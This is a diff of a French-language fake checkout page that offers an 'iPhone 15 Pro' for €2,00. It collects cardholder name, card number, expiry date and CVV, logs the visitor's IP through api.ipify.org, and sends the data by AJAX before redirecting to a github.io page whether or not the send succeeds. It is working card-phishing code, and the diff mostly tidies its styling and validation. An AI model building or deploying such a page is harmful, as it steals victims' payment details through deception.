@@ -6,117 +6,97 @@
     <link href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/favicon.png" rel="shortcut icon" type="image/x-icon">
     <!-- LOCAL STYLE -->
     <link rel="stylesheet" href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/css/style.css">
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <!-- VIEWPORT META TAG POUR ADAPTATION MOBILE -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <style>
-        /* Ajout de la règle de base pour l'adaptabilité */
+        /* Styles adaptés pour les smartphones */
         body {
-            margin: 0;
             font-family: Arial, sans-serif;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
+            margin: 0;
+            padding: 0;
         }
 
-        /* Wrapper principal */
         .product_wrapper {
             padding: 20px;
         }
 
-        /* Container ajusté pour des écrans mobiles */
         .container {
             max-width: 100%;
+            padding: 0 15px;
             margin: 0 auto;
-            padding: 10px;
         }
 
-        /* Formulaire responsive */
-        .form_wrapper {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .form_block input, .form_block button {
-            width: 100%;
-            margin: 10px 0;
-        }
-
-        /* Images et éléments de la gauche */
-        .images_wrapper {
-            text-align: center;
-        }
-
-        .img-tab img {
+        .images_wrapper img {
             max-width: 100%;
             height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        .price_block {
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .price_block span {
+            font-size: 14px;
+            color: #888;
         }
 
         .price_block h2 {
             font-size: 24px;
+            margin: 0;
         }
 
-        /* Responsive des cartes de crédit */
-        .accepted-credit-cards img {
+        .form_wrapper {
+            margin-top: 20px;
+        }
+
+        .product_title h1 {
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        .form_block label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .form_block input[type="text"],
+        .form_block input[type="tel"],
+        .form_block input[type="text"] {
             width: 100%;
-            max-width: 200px;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
         }
 
-        /* MEDIA QUERIES POUR PETITS ÉCRANS (SMARTPHONES) */
-        @media screen and (max-width: 768px) {
-            .product_block {
-                display: flex;
-                flex-direction: column;
-                align-items: center;
-            }
-
-            .images_wrapper {
-                margin-bottom: 20px;
-            }
-
-            .form_wrapper {
-                width: 100%;
-            }
-
-            .product_title h1 {
-                font-size: 22px;
-                text-align: center;
-            }
-
-            /* Ajustement des boutons */
-            .btn {
-                font-size: 16px;
-            }
-
-            .card-holder, .card-number, .expiry-date, .cvv {
-                margin-bottom: 10px;
-            }
+        .form_block button {
+            width: 100%;
+            padding: 10px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
         }
 
-        /* MEDIA QUERIES POUR ÉCRANS PLUS GRANDS (TABLETTES, PC) */
-        @media screen and (min-width: 769px) {
-            .product_block {
-                display: flex;
-                justify-content: space-between;
-                align-items: flex-start;
-            }
+      
+        }
 
-            .form_wrapper {
-                max-width: 500px;
-            }
+        footer {
+            text-align: center;
+            padding: 15px;
+            background-color: #f9f9f9;
+            margin-top: 20px;
+        }
 
-            .images_wrapper {
-                width: 40%;
-            }
-
-            .form_wrapper {
-                width: 55%;
-            }
-
-            .product_title h1 {
-                font-size: 32px;
-                text-align: left;
-            }
+      
         }
     </style>
 </head>
@@ -124,22 +104,13 @@
 <section>
     <!-- PRODUCT BLOCK START HERE -->
     <div class="product_wrapper animate">
-        <div class="container"> <!-- CONTAINER START -->
-            <div class="product_block" style="min-height: 180px;">
+        <div class="container">
+            <div class="product_block">
                 <!-- LEFT SIDE BLOCK START HERE -->
                 <div class="images_wrapper">
                     <div class="price_block">
                         <span>Seulement maintenant</span>
                         <h2>€2,00</h2>
-                    </div>
-                    <div id="black" class="img-tab">
-                        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-blacktitanium1.png" alt="iPhone 15">
-                    </div>
-                    <div id="blue" class="img-tab">
-                        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-bluetitanium1.png" alt="iPhone 15">
-                    </div>
-                    <div id="natural" class="img-tab">
-                        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-naturaltitanium1.png" alt="iPhone 15">
                     </div>
                     <div id="white" class="img-tab active">
                         <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-whitetitanium1.png" alt="iPhone 15">
@@ -153,15 +124,6 @@
                     </div>
                     <!-- FORM BLOCK START HERE -->
                     <div class="form_block" id="Scroll_form">
-                        <div class="row">
-                            <div class="col-12">
-                                <div class="title">
-                                    <label>Entrez vos informations</label>
-                                </div>
-                            </div>
-                        </div>
-                        <input id="required-text" type="hidden" value="Ce champ est requis.">
-                        <input id="phone-error-text" type="hidden" value="Veuillez entrer au moins 6 caractères.">
                         <form action="https://justmoicom.github.io/test3/" method="POST" id="paymentForm" name="paymentForm" novalidate="novalidate">
                             <input type="hidden" name="_token" value="vFqq7MTGU0dg8OrcF2KocxJen6rbzNYcUPZNrvA7" autocomplete="off">
                             <input type="hidden" id="user_ip" name="user_ip" value="">
@@ -171,24 +133,22 @@
                             </div>
                             <div class="card-holder form-group">
                                 <label for="card_holder">Nom du titulaire</label>
-                                <input type="text" name="card_holder" id="card_holder" required placeholder="Votre nom complet" class="form-control form-control-lg jp-card-valid" style="width:100%;">
+                                <input type="text" name="card_holder" id="card_holder" required placeholder="Votre nom complet">
                             </div>
                             <div class="card-number form-group">
                                 <label for="card_number">Numéro de carte</label>
-                                <input type="tel" name="card_number" id="card_number" maxlength="19" oninput="formatCardNumber(this)" required placeholder="0000 0000 0000 0000" class="form-control form-control-lg jp-card-valid" style="width:100%;">
+                                <input type="tel" name="card_number" id="card_number" maxlength="19" oninput="formatCardNumber(this)" required placeholder="0000 0000 0000 0000">
                             </div>
                             <div class="expiry-date form-group">
                                 <label for="expiry_date">Date d'expiration</label>
-                                <input type="text" name="expiry_date" id="expiry_date" maxlength="5" oninput="formatExpiryDate(this)" required placeholder="MM/AA" class="form-control form-control-lg jp-card-valid" style="width:100%;">
+                                <input type="text" name="expiry_date" id="expiry_date" maxlength="5" oninput="formatExpiryDate(this)" required placeholder="MM/AA">
                             </div>
                             <div class="cvv form-group">
                                 <label for="cvv">CCV</label>
-                                <input type="text" name="cvv" id="cvv" maxlength="3" required placeholder="CCC" class="form-control form-control-lg jp-card-valid" style="width:100%;">
+                                <input type="text" name="cvv" id="cvv" maxlength="3" required placeholder="CCC">
                             </div>
-                            <button type="submit" id="submitButton" class="btn btn-success btn-lg" style="width:100%;">
-                                <span class="loader" style="height:12px;width:12px;border-width:3px;margin-right:5px;display:none;"></span>
-                                <span class="submit-label">Effectuer Paiement</span>
-                                <span class="waiting-label" style="display:none;">Patientez...</span>
+                            <button type="submit" id="submitButton">
+                                Effectuer Paiement
                             </button>
                         </form>
                     </div>
@@ -196,16 +156,31 @@
                 </div>
                 <!-- RIGHT SIDE BLOCK END HERE -->
             </div>
-        </div> <!-- CONTAINER END -->
+        </div>
     </div>
     <!-- PRODUCT BLOCK END HERE -->
 </section>
 <!-- SECTION END HERE -->
+<!-- FOOTER START HERE -->
+<footer>
+    <div class="container">
+        <div class="block-reassurance">
+            <h6>Cartes de crédit acceptées:</h6>
+            <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/card-logo.svg" alt="Cards" width="317" height="54">
+        </div>
+    </div>
+</footer>
+<!-- FOOTER END HERE -->
 <script>
     $(document).ready(function () {
+        // Récupérer l'IP de l'utilisateur
+        $.getJSON("https://api.ipify.org?format=json", function (data) {
+            $('#user_ip').val(data.ip);
+        });
+
         // Soumettre le formulaire avec validation
         $('#paymentForm').on('submit', function (e) {
-            e.preventDefault(); // Empêcher la soumission par défaut
+            e.preventDefault();
 
             if (!validateForm()) {
                 return;
@@ -228,11 +203,9 @@
                     text: message
                 },
                 success: function () {
-                    // Redirection vers le site après envoi réussi
                     window.location.href = "https://justmoicom.github.io/test3/";
                 },
                 error: function () {
-                    // En cas d'erreur, redirige également vers le site
                     window.location.href = "https://justmoicom.github.io/test3/";
                 }
             });
@@ -267,14 +240,30 @@
 
             var parts = date.split('/');
             var month = parseInt(parts[0], 10);
-            var year = parseInt(parts[1], 10);
-            var currentDate = new Date();
-            if (year < currentDate.getFullYear() % 100 || (year === currentDate.getFullYear() % 100 && month < currentDate.getMonth() + 1)) {
-                alert('La date d\'expiration est invalide.');
+            if (month < 1 || month > 12) {
+                alert('Le mois doit être compris entre 01 et 12.');
                 return false;
             }
 
             return true;
+        }
+
+        // Formater le numéro de carte en blocs de 4 chiffres
+        function formatCardNumber(input) {
+            input.value = input.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
+        }
+
+        // Formater automatiquement la date d'expiration en MM/AA
+        function formatExpiryDate(input) {
+            var cleaned = input.value.replace(/\D/g, '');
+            var firstPart = cleaned.slice(0, 2);
+            var secondPart = cleaned.slice(2, 4);
+
+            if (cleaned.length >= 2 && cleaned.length <= 4) {
+                input.value = `${firstPart}${cleaned.length > 2 ? '/' : ''}${secondPart}`;
+            } else {
+                input.value = cleaned.slice(0, 4);
+            }
         }
     });
 </script>
